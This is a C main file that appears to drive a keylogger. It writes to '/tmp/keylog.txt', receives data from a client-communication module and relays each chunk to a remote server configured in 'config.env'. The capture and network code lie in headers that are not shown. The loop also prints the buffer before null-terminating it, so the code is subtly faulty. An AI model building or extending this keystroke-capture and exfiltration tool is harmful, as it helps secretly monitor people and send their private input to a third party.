#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include <string.h>
#include "client_comm.h"
#include "logger.h"
#include "network_client.h"

static volatile bool running = true;

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

int main(void) {
    char buf[1024];

    signal(SIGINT, handle_sigint);

    if (network_client_init("config.env") < 0) {
        fprintf(stderr, "Failed to initialize network client\n");
        return 1;
    }

    if (client_comm_init() < 0) return 1;
    if (logger_open("/tmp/keylog.txt") < 0) return 1;

    while (running) {
        int len = client_comm_recv(buf, sizeof(buf) - 1);
        printf("Received data: %s\n", buf);
        if (len > 0) {
            buf[len] = '\0';
            if (network_client_send(buf, len) < 0) {
                fprintf(stderr, "Failed to send data to server\n");
            }
            fflush(stdout);
        }
    }

    logger_close();
    network_client_cleanup();
    client_comm_cleanup();
    return 0;
}